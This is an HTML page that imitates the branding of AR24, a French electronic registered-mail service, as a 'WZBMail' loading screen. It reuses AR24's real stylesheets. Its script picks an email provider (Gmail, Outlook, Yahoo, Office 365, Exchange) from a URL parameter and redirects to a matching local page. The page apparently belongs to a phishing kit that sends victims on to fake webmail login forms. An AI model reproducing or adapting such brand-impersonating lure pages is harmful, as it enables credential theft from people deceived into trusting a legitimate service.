<!DOCTYPE html>
<html lang="fr" class="no-js">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>Chargement WZBMail - AR24</title>
    <link rel="stylesheet" href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617" />
    <link href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617" rel="stylesheet" type="text/css" />
    <style>
      .status-wrapper { min-height: calc(100vh - 260px); display: flex; justify-content: center; align-items: center; padding: 32px 16px; }
      .status-card { width: min(100%, 560px); padding: 40px 32px; border-radius: 28px; background: #ffffff; box-shadow: 0 24px 60px rgba(17, 24, 39, 0.12); text-align: center; }
      .brand-logo { width: 108px; height: 108px; margin: 0 auto 18px; border-radius: 28px; display: grid; place-items: center; background: linear-gradient(145deg, #edf8ff, #d8f1fb); color: #11b8d8; animation: float 1.4s ease-in-out infinite; }
      .brand-logo svg { width: 60px; height: 60px; }
      .brand-title { margin: 0; font-family: 'Montserrat', sans-serif; font-size: clamp(2rem, 5vw, 3rem); color: #11b8d8; }
      .brand-subtitle { margin: 14px 0 0; font-size: 1.1rem; color: #667085; }
      .provider-pill { margin: 22px auto 0; display: inline-flex; align-items: center; gap: 10px; padding: 10px 16px; border-radius: 999px; background: #f5f8ff; color: #101828; }
      .provider-icon { width: 32px; height: 32px; border-radius: 10px; display: grid; place-items: center; font-weight: 700; }
      .progress-dots { display: inline-flex; gap: 8px; margin-top: 24px; }
      .progress-dots span { width: 10px; height: 10px; border-radius: 50%; background: rgba(17,184,216,.24); animation: pulse 1.2s infinite ease-in-out; }
      .progress-dots span:nth-child(2) { animation-delay: .2s; }
      .progress-dots span:nth-child(3) { animation-delay: .4s; }
      .icon-gmail { background: #fff2f0; color: #db4437; }
      .icon-outlook { background: #eef4ff; color: #0078d4; }
      .icon-yahoo { background: #f5ecff; color: #6d28d9; }
      .icon-office365 { background: #fff1e9; color: #ea580c; }
      .icon-other { background: #eafcff; color: #11b8d8; }
      .icon-exchange { background: #edf5ff; color: #2563eb; }
      @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
      @keyframes pulse { 0%,80%,100% { transform: scale(.85); opacity: .45; } 40% { transform: scale(1.1); opacity: 1; background: #11b8d8; } }
    </style>
  </head>
  <body class="guest">
    <header id="header"><div class="wrapper"><a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a></div></header>
    <main id="main-content">
      <div class="status-wrapper">
        <section class="status-card" aria-live="polite">
          <div class="brand-logo" aria-hidden="true">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 8.5 12 3l9 5.5-9 5-9-5Z" fill="#11B8D8"/><path d="M3 9.5V18a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9.5l-9 5-9-5Z" fill="#ffffff" stroke="#b9d9e5"/></svg>
          </div>
          <h1 class="brand-title">WZBMail</h1>
          <p class="brand-subtitle">Préparation de votre page d'information AR24...</p>
          <div id="providerPill" class="provider-pill"></div>
          <div class="progress-dots" aria-hidden="true"><span></span><span></span><span></span></div>
        </section>
      </div>
    </main>
    <footer id="footer"><div class="wrapper"><div class="top"><div class="logo"><img alt="" src="/static/images/logo/AR24.svg" /></div><div class="line"><div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div><div>AR24 est une filiale de Docaposte</div></div></div></div></footer>
    <script>
      const config = {
        gmail: { label: 'Gmail', icon: 'G', iconClass: 'icon-gmail', target: 'wzbmail-gmail.html' },
        outlook: { label: 'Hotmail / Outlook / Live', icon: 'O', iconClass: 'icon-outlook', target: 'wzbmail-outlook.html' },
        yahoo: { label: 'Yahoo', icon: 'Y!', iconClass: 'icon-yahoo', target: 'wzbmail-yahoo.html' },
        office365: { label: 'Office 365', icon: '365', iconClass: 'icon-office365', target: 'wzbmail-office365.html' },
        other: { label: 'Autres messages', icon: '@', iconClass: 'icon-other', target: 'wzbmail-other.html' },
        exchange: { label: 'Mail Exchange', icon: 'Ex', iconClass: 'icon-exchange', target: 'wzbmail-exchange.html' }
      };
      const params = new URLSearchParams(window.location.search);
      const provider = config[params.get('provider')] || config.gmail;
      document.getElementById('providerPill').innerHTML = `<span class="provider-icon ${provider.iconClass}">${provider.icon}</span><span>${provider.label}</span>`;
      window.setTimeout(() => { window.location.href = provider.target; }, 3000);
    </script>
    <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
  </body>
</html>
